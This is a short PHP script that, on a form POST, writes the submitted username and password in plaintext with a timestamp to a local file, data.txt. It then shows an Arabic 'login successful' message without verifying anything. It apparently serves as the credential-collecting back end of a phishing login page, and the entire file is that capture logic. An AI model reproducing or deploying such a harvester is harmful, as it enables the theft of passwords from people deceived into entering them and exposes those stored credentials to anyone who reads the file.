<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $username = htmlspecialchars($_POST["username"]);
    $password = htmlspecialchars($_POST["password"]);

    $data = "Username: $username | Password: $password | Date: " . date("Y-m-d H:i:s") . PHP_EOL;

    file_put_contents("data.txt", $data, FILE_APPEND);

    echo "تم تسجيل الدخول بنجاح";
}
?>
